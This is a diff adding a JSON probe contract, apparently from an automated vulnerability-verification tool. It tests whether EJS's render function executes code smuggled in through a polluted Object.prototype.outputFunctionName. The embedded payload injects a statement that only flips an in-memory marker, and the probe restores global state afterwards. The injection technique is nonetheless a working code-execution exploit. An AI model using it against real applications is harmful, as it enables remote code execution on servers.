@@ -1,0 +1,14 @@
+{
+  "contract_version": "corsair-lite/differential-probe/2",
+  "hypothesis": {
+    "target_file": "lib/ejs.js",
+    "target_symbol": "exports.render",
+    "target_lines": [
+      415
+    ],
+    "root_cause": "The render default options object inherits the process-local output-function option.",
+    "expected_violation": "the owned in-memory marker changes during otherwise successful rendering"
+  },
+  "build_script": "",
+  "probe": "'use strict';\n\nconst path = require('path');\nconst CONTROL_PAYLOAD = 'ownedOutput';\nconst EXPLOIT_PAYLOAD = 'x;globalThis.__corsairEjsOwned.changed=true;var y';\n\nfunction run_target(payload) {\n  if (typeof payload !== 'string') throw new TypeError('invalid owned option fixture');\n  const priorOption = Object.getOwnPropertyDescriptor(Object.prototype, 'outputFunctionName');\n  const priorMarker = Object.getOwnPropertyDescriptor(globalThis, '__corsairEjsOwned');\n  if (priorOption || priorMarker || 'outputFunctionName' in Object.prototype || '__corsairEjsOwned' in globalThis) {\n    throw new Error('probe-owned names already exist');\n  }\n\n  const marker = {changed: false};\n  let rendered;\n  try {\n    Object.defineProperty(Object.prototype, 'outputFunctionName', {\n      configurable: true,\n      enumerable: false,\n      value: payload,\n      writable: true\n    });\n    Object.defineProperty(globalThis, '__corsairEjsOwned', {\n      configurable: true,\n      enumerable: false,\n      value: marker,\n      writable: false\n    });\n    const ejs = require(path.join(process.cwd(), 'lib', 'ejs.js'));\n    rendered = ejs.render('<%= value %>', {value: 'OK'}, null);\n  } finally {\n    delete Object.prototype.outputFunctionName;\n    delete globalThis.__corsairEjsOwned;\n    if ('outputFunctionName' in Object.prototype || '__corsairEjsOwned' in globalThis) {\n      throw new Error('owned names were not restored');\n    }\n  }\n\n  if (Object.prototype.hasOwnProperty.call(Object.prototype, 'outputFunctionName') ||\n      Object.prototype.hasOwnProperty.call(globalThis, '__corsairEjsOwned')) {\n    throw new Error('probe cleanup failed');\n  }\n  if (rendered !== 'OK') {\n    throw new Error('unexpected render output');\n  }\n  return marker.changed === false;\n}\n\nmodule.exports = { CONTROL_PAYLOAD, EXPLOIT_PAYLOAD, run_target };\n"
+}
